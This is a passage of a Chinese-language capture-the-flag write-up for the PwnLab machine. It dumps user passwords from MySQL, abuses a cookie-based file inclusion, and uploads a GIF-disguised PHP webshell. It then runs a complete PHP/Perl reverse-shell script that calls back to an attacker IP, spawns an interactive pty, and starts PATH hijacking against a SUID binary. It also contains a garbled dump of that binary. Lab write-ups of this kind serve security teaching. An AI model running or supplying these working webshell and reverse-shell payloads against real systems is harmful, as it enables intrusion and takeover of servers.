<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$server</span>	  = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;H4u%QJ_H99&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;Users&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="upload">upload</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123; <span class="keyword">die</span>(<span class="string">&#x27;You must be log in.&#x27;</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;post&#x27;</span> enctype=<span class="string">&#x27;multipart/form-data&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;file&#x27;</span> name=<span class="string">&#x27;file&#x27;</span> id=<span class="string">&#x27;file&#x27;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;Upload&#x27;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$filename</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="variable">$filetype</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">		<span class="variable">$uploaddir</span> = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">		<span class="variable">$file_ext</span>  = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageinfo</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.png&quot;</span>); </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$whitelist</span>))) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filetype</span>,<span class="string">&#x27;image&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 001&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 002&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$filetype</span>, <span class="string">&#x27;/&#x27;</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 003&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])).<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$uploadfile</span>.<span class="string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Error 4&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来的思路就变成了登录mysql,把登录密码dump出来</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>uroot <span class="operator">-</span>h <span class="number">172.17</span><span class="number">.135</span><span class="number">.71</span> <span class="operator">-</span>p</span><br><span class="line"></span><br><span class="line">Enter password: </span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL connection id <span class="keyword">is</span> <span class="number">23929</span></span><br><span class="line">Server version: <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="operator">+</span>deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2019</span>, Oracle <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its affiliates. <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> Oracle Corporation <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> help. Type <span class="string">&#x27;\c&#x27;</span> <span class="keyword">to</span> clear the <span class="keyword">current</span> input statement.</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> use Users;</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> pass             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="operator">|</span> kent <span class="operator">|</span> Sld6WHVCSkpOeQ<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mike <span class="operator">|</span> U0lmZHNURW42SQ<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> kane <span class="operator">|</span> aVN2NVltMkdSbw<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">kent JWzXuBJJNy</span><br><span class="line">mike SIfdsTEn6I</span><br><span class="line">kane iSv5Ym2GRo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>登陆后 上传文件, 限制太严格,无法上传 审计代码后发现, <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <a
href="https://vulners.com/static/appercut/en/Php/InjectionFileInclusion.html">参考资料</a></p>
<p>写一个用于写出木马文件的木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;divint3.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$ma</span>=<span class="string">&quot;&lt;?php  @eval(<span class="subst">$_POST</span>[divint3]); ?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$ma</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure>
<p>由于不知道木马写到哪里去了,失败了 使用小马
文件上传位置<strong>upload/068ae40523a24c9ef54edefd375e542d.gif</strong>
配置蚁剑
登陆成功,发现文件divint3.php,但是根目录下的<strong>divint3.php</strong>内容不是我定义的内容,存疑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a  	<span class="comment">#发行版本</span></span><br><span class="line">getconf GNU_LIBC_VERSION <span class="comment">#glibc版本</span></span><br><span class="line">glibc 2.19</span><br></pre></td></tr></table></figure>
<p>使用pt_chown提权,无效 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env</span><br><span class="line">set</span><br><span class="line">export</span><br></pre></td></tr></table></figure></p>
<p>shell 反弹脚本 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;10.160.108.146&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&quot;2333&quot;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>先查看可用shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br></pre></td></tr></table></figure></p>
<p>在nologin中使用nc弹shell,反弹回来的是nologin,使用<code>python -c "import pty;pty.spawn('/bin/rbash')"</code>得到交互式shell</p>
<p>su 到<code>kane iSv5Ym2GRo</code>,登陆成功
得到假flag<code>flag&#123;T5566Y&#125;</code></p>
<p>查看<code>.bash_history</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line">uid</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./222.sh</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /hmoe</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /mike</span><br><span class="line"><span class="built_in">cat</span> mike</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt;&gt; 222.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 222.sh</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./222.sh</span><br><span class="line"><span class="built_in">echo</span> `/bin/sh`</span><br><span class="line"><span class="built_in">export</span> PATH=./:<span class="variable">$PATH</span></span><br><span class="line">./msgike</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">./msgmike</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">./msgmike</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再次检查suid <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:/home$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/home/kane/msgmike</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>发现msgmike有suid <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 40</span><br><span class="line">drwxr-x--- 2 kane kane 4096 May 26 03:19 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 17  2016 ..</span><br><span class="line">-rw------- 1 kane kane  244 Apr 25 09:53 .bash_history</span><br><span class="line">-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwxrwxrwx 1 kane kane   10 May 21 09:56 <span class="built_in">cat</span></span><br><span class="line">-rw-r--r-- 1 root root   13 Apr 25 10:32 flag_wrong.txt</span><br><span class="line">-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike</span><br><span class="line">-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile</span><br></pre></td></tr></table></figure></p>
<p>粗略分析msgmike <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF`4l4(44444@@@@@ $LLL锟斤拷HHHDDP锟絫dXXX,,Q锟絫d/lib/ld-linux.so.2GNU GNU锟斤拷锟�3锟終锟絫g没锟斤拷&#125;雸砮  锟終锟斤拷,E #3鈻�</span><br><span class="line">T4DHLPTS锟斤拷锟斤拷锟絎锟斤拷锟斤拷锟斤拷锟斤拷t锟�*锟絒锟斤拷5&lt;锟�%@锟�%Dh锟斤拷锟斤拷锟斤拷%H锟斤拷锟斤拷锟斤拷%Lh锟斤拷锟斤拷锟斤拷%Ph鈻掞拷锟斤拷锟斤拷锟�%Th 锟斤拷锟斤拷锟�1锟絕锟斤拷锟斤拷锟絇TRh h锟絈Vh[锟斤拷锟斤拷锟斤拷f锟絝锟絝锟絝锟絝锟絝锟絝锟斤拷$锟絝锟絝锟絝锟絝锟絝锟絝锟斤拷c-`锟斤拷v鈻掞拷锟斤拷tU锟斤拷锟斤拷h`锟叫冿拷锟斤拷脨锟絫&amp;锟絗-`锟斤拷锟斤拷锟斤拷锟斤拷锟絫锟斤拷tU锟斤拷锟斤拷Ph`锟揭冿拷锟斤拷脥t&amp;锟斤拷&#x27;锟�=`uU锟斤拷锟斤拷|锟斤拷锟斤拷`锟斤拷锟絝锟斤拷H锟斤拷锟絬霌峷锟斤拷锟絫锟経锟斤拷锟斤拷P锟揭冿拷锟斤拷u锟斤拷锟斤拷L$锟斤拷锟斤拷q锟経锟斤拷Q锟斤拷锟絟锟絟锟斤拷锟斤拷锟斤拷锟斤拷锟絟锟絟锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷</span><br><span class="line">                                                                                    h@锟絤锟斤拷锟斤拷锟斤拷M锟缴峚锟斤拷f锟経W1锟絍S锟斤拷锟斤拷锟斤拷锟絵锟斤拷锟絣$0锟斤拷</span><br><span class="line">锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟絊锟斤拷c锟斤拷锟斤拷锟�                                                                                                    锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟�)锟斤拷锟斤拷锟絫&#x27;锟斤拷锟紻$8锟�,$锟紻锟紻$4锟紻$锟斤拷锟斤拷锟斤拷锟�9锟絬邇锟絒^_]锟斤拷</span><br><span class="line">                        锟絒锟絚at /home/mike/msg.txt(锟斤拷锟斤拷D锟斤拷锟絟X锟斤拷锟斤拷锟斤拷锟斤拷锟絲R|</span><br><span class="line">                                                                        \锟斤拷锟紽</span><br><span class="line">                                                                             J</span><br><span class="line">                                                                              tx?鈻�;*2$&quot;(@锟斤拷锟斤拷SD</span><br><span class="line">                                                                                               GuCu|@</span><br><span class="line">                                                                                                     A锟紺</span><br><span class="line">                                                                                                        8l锟斤拷锟斤拷a锟紸</span><br><span class="line">                                                                                                                 锟紺锟紸锟絅0HA锟紸锟�</span><br><span class="line">                                                                                                                             AA锟斤拷锟斤拷锟斤拷0锟�</span><br><span class="line">$@鈻扗锟斤拷锟給锟斤拷锟�                                                                                                                           </span><br><span class="line">^</span><br><span class="line"> 8(锟斤拷锟給锟斤拷锟斤拷o锟斤拷锟給zL&amp;6FVGCC: (Debian 4.9.2-10) 4.9.2GCC: (Debian 4.8.4-1) 4.8.4.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.got.plt.data.bss.comment4Hh锟斤拷z锟斤拷    锟斤拷</span><br><span class="line"> </span><br><span class="line">锟�</span><br><span class="line">$8X锟紷DHL48X鈻抈鈻掞拷锟�</span><br><span class="line">(&lt; P`鈻抃 v锟絏鈻掞拷锟� 锟絓鈻掞拷&lt;锟斤拷锟斤拷a 锟�</span><br><span class="line">        crtstuff.c__JCR_LIST__deregister_tm_clonesregister_tm_clones__do_global_dtors_auxcompleted.6279__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrymsgmike.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxdata_start_edata_fini__data_startsystem@@GLIBC_2.0__gmon_start____dso_handle_IO_stdin_usedsetreuid@@GLIBC_2.0__libc_start_main@@GLIBC_2.0__libc_csu_init_end_start_fp_hw__bss_startmainsetregid@@GLIBC_2.0_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable_init4#HH 1hh$D锟斤拷锟給锟斤拷 N</span><br><span class="line">               锟斤拷pV^^锟斤拷锟給zzk锟斤拷锟給锟斤拷 z    锟斤拷      B锟斤拷(</span><br><span class="line">                                                   锟�#锟絗锟絗`锟斤拷$$锟�88锟絏X,锟斤拷锟斤拷锟紷@锟紻D锟紿H锟絃L锟�44锟�88 锟絏``锟�0`9锟絇- 锟�</span><br><span class="line">                                                                                                         |</span><br></pre></td></tr></table></figure> 有一句<strong>cat
/home/mike/msg.txt</strong> 应该就是其所封装的命令</p>
<p>属主是mike</p>
<p>在history中有这么一句 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=./:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure> 那么,我们也构造一句
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/home/kane:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure>
<p>查看PATH中第一个目录的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:/usr/local$ <span class="built_in">ls</span> -lad bin</span><br><span class="line"><span class="built_in">ls</span> -lad bin</span><br><span class="line">drwxrwsr-x 2 root staff 4096 Mar 17  2016 bin</span><br></pre></td></tr></table></figure>
